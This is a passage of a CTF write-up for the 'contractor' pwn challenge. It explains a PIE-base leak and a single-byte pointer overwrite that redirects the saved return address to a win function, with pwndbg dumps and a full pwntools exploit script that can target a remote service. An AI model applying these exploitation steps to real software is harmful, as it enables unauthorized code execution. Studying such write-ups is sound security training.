The flow is that, so we need to leak `pie base` first

```py
    sl(b'A' * 15)
    sl(b'B' * 255)
    sl(b'4')
    s(b'C' * 16)

    ru(b'CCCCCCCCCCCCCCCC')
    __libc_csu_init = u64(rl()[:-1].ljust(0x8, b'\0'))
    exe.address = __libc_csu_init - exe.sym["__libc_csu_init"]
    slog("__libc_csu_init", __libc_csu_init)
    slog("pie base", exe.address)
```

Then is let the program return to `win` function. If we look carefully in option 4, we have `Buffer Overflow` and once it copy our input from `savebuffer` to `speciality` it will do like this

```c
.text:000000000000195E                 mov     eax, cs:i
.text:0000000000001964                 movzx   ecx, cs:safe_buffer
.text:000000000000196B                 mov     rdx, [rbp+s]
.text:000000000000196F                 cdqe
.text:0000000000001971                 mov     [rdx+rax+118h], cl
.text:0000000000001978                 mov     eax, cs:i
.text:000000000000197E                 add     eax, 1
```

This is like `*alloca + 0x118`, which is location of `s->speciality`, so that means `speciality + 0x20 == saved RIP` or `*alloca + 0x118 + 0x20 == saved RIP`. So what we need to do is overwrite that `buf pointer` to make it be `*alloca + 0x118 + 0x20` (we just can overwrite 1 byte). And according to the `disassembly` I can calculate that 1 byte we need to overwrite is `0x1f` because after it successfully overwrite saved RIP it'll `i + 1` to it

```gdb
21:0108│-048 0x7ffccba40a08 ◂— 0x42424242424242 /* 'BBBBBBB' */
22:0110│-040 0x7ffccba40a10 ◂— 4
23:0118│-038 0x7ffccba40a18 ◂— 0x6161616261616161 ('aaaabaaa')
24:0120│-030 0x7ffccba40a20 ◂— 0x6161616461616163 ('caaadaaa')
25:0128│-028 0x7ffccba40a28 ◂— 0x6161616661616165 ('eaaafaaa')
26:0130│-020 0x7ffccba40a30 ◂— 0x261616167
27:0138│-018 0x7ffccba40a38 —▸ 0x7ffccba4091f ◂— 0x4242424242424242 ('BBBBBBBB')
28:0140│-010 0x7ffccba40a40 —▸ 0x7ffccba40b40 ◂— 1
29:0148│-008 0x7ffccba40a48 ◂— 0xa1044c48b6ae7a00
2a:0150│ rbp 0x7ffccba40a50 ◂— 0
2b:0158│+008 0x7ffccba40a58 —▸ 0x55be678c7343 (contract) ◂— endbr64
2c:0160│+010 0x7ffccba40a60 ◂— 0x50 /* 'P' */
2d:0168│+018 0x7ffccba40a68 —▸ 0x7ffccba40b48 —▸ 0x7ffccba40f67 ◂— '/mnt/e/sec/CTFs/2025/HTBCA/pwn_contractor/challenge/contractor'
2e:0170│+020 0x7ffccba40a70 ◂— 0x1487a07a0
2f:0178│+028 0x7ffccba40a78 —▸ 0x55be678c7441 (main) ◂— endbr64
30:0180│+030 0x7ffccba40a80 —▸ 0x55be678c7b50 (__libc_csu_init) ◂— endbr64
31:0188│+038 0x7ffccba40a88 ◂— 0xb2689d4c54cd172b
pwndbg> p/x 0x7ffccba40a58-0x7ffccba4091f
$1 = 0x139
pwndbg> p/x 0x7ffccba40a58-0x7ffccba4091f-0x20
$2 = 0x119
```

This might seem confusing because of my poor explanation, but basically we have to make sure that the next copy to the stack will be right at `saved RIP` and to do that we have to align it to `*alloca + 0x118 + 0x20`. As for the reason why the last byte is overwritten, it is `0x1f` and not `0x20`. We will start with `0x20` first.

If normally `*alloca` is now at the top stack

```gdb
pwndbg> p/x 0x7ffccba40a58-0x7ffccba40900
$7 = 0x158
```

But when analyzing the disassembly, we see that when we mistakenly enter `speciality` where `Buffer Overflow` occurs, it will be `*alloca + 0x118` and we see that from `buf pointer` to `saved RIP`, the offset will be `0x20`. If we still take the old pointer value, it will not be correct at saved RIP.

```py
pwndbg> p/x 0x7ffccba40900+0x118+0x20
$12 = 0x7ffccba40a38
```

We will see it right away `buf pointer` this is not what we expected so we need to add `0x20` to the old `*alloca` address (`*(old alloca) + 0x118 + 0x20 + 0x20) to make it correct as we calculated. But we have to subtract one because if in the perfect case we successfully write `saved RIP` on the next copy i.e. `i + 1` at this point our offset will be off so we need to subtract one

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from time import sleep

context.log_level = 'debug'
exe = context.binary = ELF('./contractor', checksec=False)
libc = exe.libc

def init(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        docker_port = sys.argv[1]
        docker_path = sys.argv[2]
        p = remote("localhost", docker_port)
        sleep(1)
        pid = process(["pgrep", "-fx", docker_path]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        pause()
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''

# brva 0x153C
# brva 0x15BB
# brva 0x1639
# brva 0x167A
# brva 0x1735
brva 0x175E
brva 0x1AA4

c
c
'''.format(**locals())

p = init()

# ==================== EXPLOIT ====================

def exploit():

    sl(b'A' * 15)
    sl(b'B' * 255)
    sl(b'4')
    s(b'C' * 16)

    ru(b'CCCCCCCCCCCCCCCC')
    __libc_csu_init = u64(rl()[:-1].ljust(0x8, b'\0'))
    exe.address = __libc_csu_init - exe.sym["__libc_csu_init"]
    slog("__libc_csu_init", __libc_csu_init)
    slog("pie base", exe.address)

    sl(b'4')
    sleep(0.4)

    payload = flat(
    {
        28: p32(1)
    },
        b'\x1f' + p64(exe.sym.contract)
    )
    sla(b'at: ', payload)
    ru(b' lad!\n\n')


    interactive(flag=True)

if __name__ == '__main__':
    exploit()
```
